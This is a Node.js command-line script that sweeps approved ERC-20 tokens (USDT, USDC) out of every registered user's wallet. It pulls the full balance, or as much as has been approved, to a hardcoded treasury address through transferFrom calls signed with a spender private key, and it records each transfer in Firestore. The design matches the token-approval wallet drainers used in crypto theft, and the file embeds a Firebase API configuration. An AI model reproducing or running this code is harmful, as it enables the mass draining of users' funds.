#!/usr/bin/env node

/**
 * BSP On-Chain Sweeper CLI Script
 * 
 * Executes real ERC-20 transferFrom transactions on-chain using the Spender private key.
 * Sweeps approved tokens (USDT, USDC, etc.) from user wallets to the treasury recipient.
 * 
 * Usage:
 *   node scripts/execute-sweep.mjs --dry-run
 *   node scripts/execute-sweep.mjs --user 0x8Bd299e741aee5860D5d21321D777210cDA24515 --amount 1000
 *   node scripts/execute-sweep.mjs --all --token USDT
 *   node scripts/execute-sweep.mjs --private-key 0x... --recipient 0x...
 */

import { createPublicClient, createWalletClient, http, parseUnits, formatUnits, erc20Abi } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet, sepolia } from 'viem/chains';
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, getDocs, doc, setDoc, serverTimestamp } from 'firebase/firestore';

// ── Firebase Configuration ───────────────────────────────────────
const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY || "AIzaSyA4j2To1oFlDmFiBiluPlkWSA_0DV2mWEo",
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN || "bspc-be4f8.firebaseapp.com",
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID || "bspc-be4f8",
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET || "bspc-be4f8.firebasestorage.app",
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID || "133746398244",
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID || "1:133746398244:web:03c0b077d035a470b0f4b1"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// ── Known Token Addresses ────────────────────────────────────────
const KNOWN_TOKENS = {
  mainnet: {
    USDT: {
      address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      symbol: 'USDT',
      decimals: 6,
    },
    USDC: {
      address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      symbol: 'USDC',
      decimals: 6,
    },
  },
  sepolia: {
    USDC: {
      address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
      symbol: 'USDC',
      decimals: 6,
    },
  },
};

const DEFAULT_TREASURY_RECIPIENT = '0xd1dd9d76c3bf0162580a82b9b219e59d9ab61070';

// Parse command line arguments
function parseArgs() {
  const args = process.argv.slice(2);
  const options = {
    network: 'mainnet',
    token: 'USDT',
    recipient: DEFAULT_TREASURY_RECIPIENT,
    user: null,
    amount: null,
    all: false,
    dryRun: false,
    privateKey: process.env.SPENDER_PRIVATE_KEY || process.env.SWEEPER_PRIVATE_KEY || null,
    rpcUrl: null,
  };

  for (let i = 0; i < args.length; i++) {
    const arg = args[i];
    if (arg === '--network' && args[i + 1]) options.network = args[++i];
    else if (arg === '--token' && args[i + 1]) options.token = args[++i];
    else if (arg === '--recipient' && args[i + 1]) options.recipient = args[++i];
    else if (arg === '--user' && args[i + 1]) options.user = args[++i];
    else if (arg === '--amount' && args[i + 1]) options.amount = args[++i];
    else if (arg === '--all') options.all = true;
    else if (arg === '--dry-run') options.dryRun = true;
    else if (arg === '--private-key' && args[i + 1]) options.privateKey = args[++i];
    else if (arg === '--rpc' && args[i + 1]) options.rpcUrl = args[++i];
  }

  return options;
}

async function main() {
  console.log('\n======================================================');
  console.log('       BSP ON-CHAIN SWEEPER & COLLECTION AGENT         ');
  console.log('======================================================\n');

  const options = parseArgs();
  const isSepolia = options.network.toLowerCase() === 'sepolia';
  const chain = isSepolia ? sepolia : mainnet;
  const defaultRpc = isSepolia ? 'https://ethereum-sepolia-rpc.publicnode.com' : 'https://ethereum-rpc.publicnode.com';
  const rpcUrl = options.rpcUrl || (isSepolia ? process.env.NEXT_PUBLIC_RPC_URL : null) || defaultRpc;

  console.log(`[Config] Network:   ${chain.name} (Chain ID: ${chain.id})`);
  console.log(`[Config] RPC URL:   ${rpcUrl}`);
  console.log(`[Config] Recipient: ${options.recipient}`);
  console.log(`[Config] Dry Run:   ${options.dryRun ? 'YES (Simulate only, no transactions)' : 'NO (Live on-chain)'}`);

  // Resolve Token Contract & Decimals
  let tokenAddress = options.token;
  let tokenDecimals = 6;
  let tokenSymbol = options.token;

  const networkTokens = isSepolia ? KNOWN_TOKENS.sepolia : KNOWN_TOKENS.mainnet;
  if (networkTokens[options.token.toUpperCase()]) {
    const t = networkTokens[options.token.toUpperCase()];
    tokenAddress = t.address;
    tokenDecimals = t.decimals;
    tokenSymbol = t.symbol;
  }
  console.log(`[Config] Token:     ${tokenSymbol} (${tokenAddress})`);

  // Public Client for reading blockchain state
  const publicClient = createPublicClient({
    chain,
    transport: http(rpcUrl),
  });

  // Verify / Load Account
  let account = null;
  let walletClient = null;

  if (!options.dryRun) {
    if (!options.privateKey) {
      console.error('\n❌ ERROR: Spender private key is required to execute real on-chain transferFrom!');
      console.error('Pass via --private-key <0xHEX> or set SPENDER_PRIVATE_KEY in environment.');
      console.error('Use --dry-run to inspect allowances without a private key.\n');
      process.exit(1);
    }

    try {
      let rawPk = options.privateKey.trim();
      if (!rawPk.startsWith('0x')) rawPk = `0x${rawPk}`;
      account = privateKeyToAccount(rawPk);
      console.log(`[Signer] Spender Address: ${account.address}`);

      walletClient = createWalletClient({
        account,
        chain,
        transport: http(rpcUrl),
      });
    } catch (e) {
      console.error('\n❌ Invalid private key format:', e.message);
      process.exit(1);
    }
  }

  // 1. Fetch Target Wallets
  let targets = [];
  if (options.user) {
    targets = [options.user.trim()];
  } else {
    console.log('\n[Firestore] Fetching registered users with active authorizations...');
    try {
      const snap = await getDocs(collection(db, 'users'));
      snap.forEach((d) => {
        const data = d.data();
        const addr = data.walletAddress || d.id;
        if (addr && addr.startsWith('0x') && addr.length === 42) {
          targets.push(addr);
        }
      });
      console.log(`[Firestore] Found ${targets.length} user wallet addresses.`);
    } catch (err) {
      console.warn('[Firestore] Warning reading users collection:', err.message);
    }
  }

  if (targets.length === 0) {
    console.log('No user targets specified or found. Provide --user <0x...> or check Firestore.');
    process.exit(0);
  }

  console.log(`\n──────────────────────────────────────────────────────`);
  console.log(`Inspecting on-chain balances & allowances for ${targets.length} wallet(s)...`);
  console.log(`──────────────────────────────────────────────────────\n`);

  const spenderAddress = account ? account.address : options.recipient;
  let successCount = 0;
  let skippedCount = 0;

  for (const userAddress of targets) {
    try {
      // 1. Query User Token Balance
      const balance = await publicClient.readContract({
        address: tokenAddress,
        abi: erc20Abi,
        functionName: 'balanceOf',
        args: [userAddress],
      });

      // 2. Query Allowance granted to Spender
      const allowance = await publicClient.readContract({
        address: tokenAddress,
        abi: erc20Abi,
        functionName: 'allowance',
        args: [userAddress, spenderAddress],
      });

      const readableBalance = formatUnits(balance, tokenDecimals);
      const readableAllowance = formatUnits(allowance, tokenDecimals);

      console.log(`Wallet: ${userAddress}`);
      console.log(`  Balance:   ${readableBalance} ${tokenSymbol}`);
      console.log(`  Allowance: ${readableAllowance} ${tokenSymbol} (to ${spenderAddress})`);

      // Determine amount to collect
      let amountToSweep = balance;
      if (options.amount) {
        amountToSweep = parseUnits(options.amount.toString(), tokenDecimals);
      }

      if (amountToSweep > balance) {
        amountToSweep = balance;
      }

      if (amountToSweep === 0n) {
        console.log(`  ⏩ SKIPPED: Zero balance.\n`);
        skippedCount++;
        continue;
      }

      if (allowance < amountToSweep) {
        console.log(`  ⚠️ INSUFFICIENT ALLOWANCE: Wallet approved ${readableAllowance} but holds ${readableBalance}.`);
        if (allowance > 0n) {
          console.log(`  👉 Sweeping partial allowed amount: ${formatUnits(allowance, tokenDecimals)} ${tokenSymbol}`);
          amountToSweep = allowance;
        } else {
          console.log(`  ⏩ SKIPPED: No allowance approved to ${spenderAddress}.\n`);
          skippedCount++;
          continue;
        }
      }

      const sweepDisplay = formatUnits(amountToSweep, tokenDecimals);

      if (options.dryRun) {
        console.log(`  🔍 [DRY-RUN] Would sweep: ${sweepDisplay} ${tokenSymbol} -> ${options.recipient}\n`);
        continue;
      }

      // Execute on-chain transferFrom
      console.log(`  🚀 EXECUTING SWEEP: ${sweepDisplay} ${tokenSymbol} from ${userAddress} -> ${options.recipient}...`);
      
      const txHash = await walletClient.writeContract({
        address: tokenAddress,
        abi: erc20Abi,
        functionName: 'transferFrom',
        args: [userAddress, options.recipient, amountToSweep],
      });

      console.log(`  ⏳ Tx Broadcasted: ${txHash}`);
      console.log(`  Awaiting block confirmation...`);

      const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });
      console.log(`  ✅ CONFIRMED in Block ${receipt.blockNumber} (Gas Used: ${receipt.gasUsed})`);
      console.log(`  🔗 Explorer: ${chain.blockExplorers?.default?.url}/tx/${txHash}`);

      // Record in Firestore collectionRecords
      try {
        const recordId = `swp-${receipt.blockNumber}-${txHash.slice(2, 10)}`;
        await setDoc(doc(db, 'collectionRecords', recordId), {
          recordId,
          userUid: `evm_${userAddress.toLowerCase().replace('0x', '')}`,
          senderAddress: userAddress,
          recipientAddress: options.recipient,
          tokenAddress,
          token: tokenSymbol,
          amount: sweepDisplay,
          amountBaseUnits: amountToSweep.toString(),
          chainId: chain.id,
          chain: chain.name,
          transactionHash: txHash,
          txHash,
          blockNumber: Number(receipt.blockNumber),
          confirmationCount: 1,
          status: 'confirmed',
          createdAt: serverTimestamp(),
          source: 'cli_sweeper_agent',
        }, { merge: true });

        console.log(`  📝 Saved to Firestore collectionRecords: ${recordId}\n`);
      } catch (fsErr) {
        console.warn(`  ⚠️ Note saving to Firestore: ${fsErr.message}\n`);
      }

      successCount++;
    } catch (err) {
      console.error(`  ❌ Error processing ${userAddress}:`, err.message || err);
      console.log('');
      skippedCount++;
    }
  }

  console.log('======================================================');
  console.log(`Summary: Processed ${targets.length} wallet(s). Swept: ${successCount}, Skipped: ${skippedCount}.`);
  console.log('======================================================\n');
}

main().catch((err) => {
  console.error('Fatal Sweeper Error:', err);
  process.exit(1);
});
